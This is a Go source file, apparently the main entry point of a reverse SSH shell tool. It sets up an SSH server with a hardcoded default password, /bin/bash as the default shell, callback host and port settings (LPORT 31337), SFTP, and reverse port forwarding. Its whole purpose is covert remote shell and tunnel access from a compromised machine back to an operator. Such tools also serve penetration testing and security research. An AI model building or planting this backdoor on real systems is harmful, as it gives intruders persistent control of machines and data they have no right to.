package main

import (
	"github.com/gliderlabs/ssh"
)

// The following variables can be set via ldflags
var (
	localPassword = "letmeinbrudipls"
	authorizedKey = ""
	defaultShell  = "/bin/bash"
	version       = "1.3.0-dev"
	LUSER         = "reverse"
	LHOST         = ""
	LPORT         = "31337"
	BPORT         = "8888"
	NOCLI         = ""
)

func main() {
	var (
		p              = setupParameters(NOCLI)
		forwardHandler = &ssh.ForwardedTCPHandler{}
		server         = ssh.Server{
			Handler:                       createSSHSessionHandler(p.shell),
			PasswordHandler:               createPasswordHandler(localPassword),
			PublicKeyHandler:              createPublicKeyHandler(authorizedKey),
			LocalPortForwardingCallback:   createLocalPortForwardingCallback(p.noShell),
			ReversePortForwardingCallback: createReversePortForwardingCallback(),
			SessionRequestCallback:        createSessionRequestCallback(p.noShell),
			ChannelHandlers: map[string]ssh.ChannelHandler{
				"direct-tcpip": ssh.DirectTCPIPHandler,
				"session":      ssh.DefaultSessionHandler,
				"rs-info":      createExtraInfoHandler(),
			},
			RequestHandlers: map[string]ssh.RequestHandler{
				"tcpip-forward":        forwardHandler.HandleSSHRequest,
				"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
			},
			SubsystemHandlers: map[string]ssh.SubsystemHandler{
				"sftp": createSFTPHandler(),
			},
		}
	)

	run(p, &server)
}
